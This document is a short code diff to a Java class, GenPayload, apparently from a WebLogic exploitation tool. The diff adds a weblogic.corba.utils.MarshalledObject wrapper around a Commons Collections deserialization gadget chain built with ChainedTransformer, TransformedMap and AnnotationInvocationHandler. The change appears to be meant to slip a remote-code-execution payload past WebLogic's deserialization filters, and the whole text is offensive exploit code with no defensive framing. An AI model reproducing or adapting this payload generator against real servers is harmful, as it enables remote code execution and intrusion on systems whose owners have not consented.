@@ -19,6 +19,7 @@ import com.mtx.core.tools.MTXLoadJar;
 
 public class GenPayload
 {
+	// weblogic.corba.utils.MarshalledObject
 	public static byte[] Gen(String OS, byte[] ClassByte)
 	throws Exception
 	
@@ -57,6 +58,9 @@ public class GenPayload
 		Transformer transformerChain = new ChainedTransformer(transforms);
 		Map innermap = new HashMap();
 		innermap.put("value", "value");
+		
+		weblogic.corba.utils.MarshalledObject mso = new weblogic.corba.utils.MarshalledObject((Object)innermap);
+		
 		Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
 		Class cls =
 		Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
